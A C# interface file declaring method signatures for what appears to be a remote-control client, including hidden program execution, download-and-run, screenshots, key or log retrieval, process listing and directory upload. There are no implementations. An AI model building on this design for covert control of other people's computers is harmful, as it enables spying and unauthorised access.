using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text;

namespace Interfaces.Users
{
    public interface IUser
    {
        void UploadDirectory(string dirPath, string uploadPath);
        List<string> GetLog();
        IInfoDevice GetInfoDevice();
        void DownloadFloader(string ftpPath, string localPath);
        void DownloadUpdate();
        void Reconnect();
        void RunHideProgram(string file);
        void DownloadAndRun(string file);
        void DeleteFile(string file);
        ISetting GetSetting();
        string TestFunc(string s);
        Bitmap ScreenShot();
        List<string> GetListProc();
        string GetKey();
        string[] GetDirectoryFiles(string path, string searchPattern);
        List<string> GetDrives();
    }
}
